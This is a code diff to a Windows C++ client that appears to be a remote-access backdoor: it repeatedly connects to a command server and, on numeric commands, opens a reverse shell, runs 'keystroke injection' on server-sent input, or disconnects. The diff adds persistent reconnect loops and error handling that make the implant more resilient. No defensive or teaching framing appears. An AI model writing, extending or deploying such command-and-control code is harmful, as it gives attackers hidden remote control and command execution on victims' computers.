@@ -6,6 +6,8 @@
 #include <thread>
 #include <tuple>
 #include <atomic>
+#include <sstream> // Include for stringstream
+#include <ws2tcpip.h> // For gai_strerror
 
 using namespace std;
 #pragma comment(lib, "ws2_32.lib")
@@ -24,84 +26,126 @@ void give_command(const std::string &command);
 void rev_shell();
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
+void safe_closesocket(SOCKET& s) {
+    if (s != INVALID_SOCKET) {
+        shutdown(s, SD_BOTH);
+        closesocket(s);
+        s = INVALID_SOCKET;
+    }
+}
+
 int main()
 {
-    // Initialize Winsock
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    bool outerloop = true;
+    while(outerloop)
     {
-        std::cerr << "WSAStartup failed.\n";
-        return 1;
-    }
+        SOCKET sock = INVALID_SOCKET;
+        bool connected = false;
 
-    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (sock == INVALID_SOCKET)
-    {
-        std::cerr << "socket failed.\n";
-        WSACleanup();
-        return 1;
-    }
-
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(8081); // Port for input socket
-    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
-
-    bool connected = false;
-    while (!connected)
-    {
-        if (connect(sock, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+        // Initialize Winsock
+        WSADATA wsaData;
+        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
         {
-            std::cerr << "Connection failed. Retrying in 2 seconds...\n";
-            Sleep(2000); // Wait for 2 seconds before retrying
+            std::cerr << "WSAStartup failed.\n";
+            return 1;
         }
-        else
+
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock == INVALID_SOCKET)
         {
-            connected = true; // Successfully connected
-            std::cout << "Connected to the server!\n";
+            std::cerr << "socket failed.\n";
+            WSACleanup();
+            return 1;
         }
-    }
 
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        sockaddr_in serverAddr;
+        serverAddr.sin_family = AF_INET;
+        serverAddr.sin_port = htons(8081); // Port for input socket
+        serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
-    bool loop = true;
-    while(loop)
-    {
-        switch (receive_data_int(sock))
+        connected = false;
+        while (!connected)
         {
-            case 2:
+            if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
             {
-                rev_shell();
-                break;
-            }
+                int error = WSAGetLastError();
 
-            case 3:
-            {                
-                ExecuteCommand(receive_data(sock));
-                break;
+                if (error != WSAECONNREFUSED)
+                {
+                    std::stringstream ss;
+                    ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
+                    std::cerr << ss.str();
+                } else
+                {
+                    std::cerr << "Connection refused. Retrying in 2 seconds...\n";
+                }
+                Sleep(2000);
             }
-
-            case 0:
+            else
             {
-                closesocket(sock);
-                WSACleanup();
+                std::cout << "Connected to the server!\n";
+                connected = true;
+            }
+        }
+        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+        bool loop = true;
+        while(loop)
+        {
+            int received = receive_data_int(sock);
+            if (received == 0 && WSAGetLastError() != 0) { // Check for recv errors other than graceful disconnect
+                std::cerr << "Receive error, disconnecting.\n";
                 loop = false;
-                break;
+                connected = false;
+                break; // Exit inner loop to reconnect
             }
-            default:
+
+            switch (received)
             {
-                break;
+                case 2:                                                                                         //rev shell
+                {
+                    rev_shell();
+                    break;
+                }
+
+                case 3:                                                                                         //keystroke injection
+                {                
+                    ExecuteCommand(receive_data(sock));
+                    break;
+                }
+
+                case 99:                                                                                        //dc from server
+                {
+                    std::cout << "Server initiated disconnect.\n";
+                    loop = false;
+                    connected = false; // Crucial: Reset connected flag here
+                    break;
+                }
+                case 11:                                                                                        //end all
+                {
+                    loop = false;
+                    outerloop = false;
+                    break;
+                }
+                default:
+                {
+                    break;
+                }
             }
         }
+
+        safe_closesocket(sock);
+        WSACleanup();
+
+        if (outerloop && !connected) {
+            std::cout << "Waiting to reconnect...\n";
+            Sleep(5000);
+        }
+
     }
 
 
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    
-    //send_data(sock, " closing!! ");
-
-    closesocket(sock);
-    WSACleanup();
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
     return 0;
 }
